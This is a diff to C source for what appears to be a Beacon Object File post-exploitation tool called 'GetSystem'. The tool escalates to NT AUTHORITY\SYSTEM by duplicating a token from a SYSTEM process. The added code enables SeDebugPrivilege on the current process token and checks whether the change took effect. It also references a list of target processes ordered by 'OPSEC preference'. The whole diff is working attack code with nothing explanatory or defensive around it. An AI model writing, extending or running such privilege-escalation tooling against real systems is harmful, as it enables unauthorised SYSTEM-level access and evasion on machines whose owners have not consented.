@@ -26,6 +26,8 @@ DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
 DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, DWORD, LPVOID, DWORD, PDWORD);
 DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$RevertToSelf(void);
 DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupAccountSidW(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PDWORD);
+DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PVOID);
+DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PVOID, DWORD, PVOID, PDWORD);
 
 /* ── ntdll ── */
 DECLSPEC_IMPORT DWORD NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
@@ -63,11 +65,25 @@ DECLSPEC_IMPORT int __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
 #define PAGE_READWRITE              0x04
 #endif
 
+#ifndef TOKEN_ADJUST_PRIVILEGES
+#define TOKEN_ADJUST_PRIVILEGES     0x0020
+#endif
+#ifndef SE_PRIVILEGE_ENABLED
+#define SE_PRIVILEGE_ENABLED        0x00000002
+#endif
+
 #define MY_SecurityDelegation       3
 #define MY_SecurityImpersonation    2
 #define MY_TokenImpersonation       2
 #define MY_TokenUser                1
 #define SystemProcessInformation    5
+
+/* TOKEN_PRIVILEGES with single entry for AdjustTokenPrivileges */
+typedef struct _MY_TOKEN_PRIVILEGES {
+    DWORD PrivilegeCount;
+    LUID  Luid;
+    DWORD Attributes;
+} MY_TOKEN_PRIVILEGES;
 
 /*
  * Check if a token belongs to NT AUTHORITY\SYSTEM.
@@ -127,6 +143,55 @@ void go(char *args, int args_len) {
 
     BeaconPrintf(CALLBACK_OUTPUT,
         "[*] GetSystem — token duplication from SYSTEM process\n");
+
+    /* ── Enable SeDebugPrivilege ── */
+    {
+        HANDLE hSelfToken = NULL;
+        if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
+                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelfToken)) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!] OpenProcessToken(self) failed (%u) — cannot enable SeDebugPrivilege\n",
+                KERNEL32$GetLastError());
+            return;
+        }
+
+        MY_TOKEN_PRIVILEGES tp;
+        tp.PrivilegeCount = 1;
+        tp.Attributes = SE_PRIVILEGE_ENABLED;
+
+        /* L"SeDebugPrivilege" as wchar_t array */
+        wchar_t privName[] = L"SeDebugPrivilege";
+
+        if (!ADVAPI32$LookupPrivilegeValueW(NULL, privName, &tp.Luid)) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!] LookupPrivilegeValue failed (%u)\n",
+                KERNEL32$GetLastError());
+            KERNEL32$CloseHandle(hSelfToken);
+            return;
+        }
+
+        if (!ADVAPI32$AdjustTokenPrivileges(hSelfToken, FALSE,
+                &tp, sizeof(tp), NULL, NULL)) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!] AdjustTokenPrivileges failed (%u)\n",
+                KERNEL32$GetLastError());
+            KERNEL32$CloseHandle(hSelfToken);
+            return;
+        }
+
+        /* AdjustTokenPrivileges returns TRUE even if it didn't
+           actually enable the privilege — check GetLastError */
+        DWORD adjustErr = KERNEL32$GetLastError();
+        if (adjustErr == 1300) { /* ERROR_NOT_ALL_ASSIGNED */
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!] SeDebugPrivilege not available — not running as admin?\n");
+            KERNEL32$CloseHandle(hSelfToken);
+            return;
+        }
+
+        KERNEL32$CloseHandle(hSelfToken);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] SeDebugPrivilege enabled\n");
+    }
 
     /* Target processes in OPSEC preference order */
     const wchar_t *targets[] = {
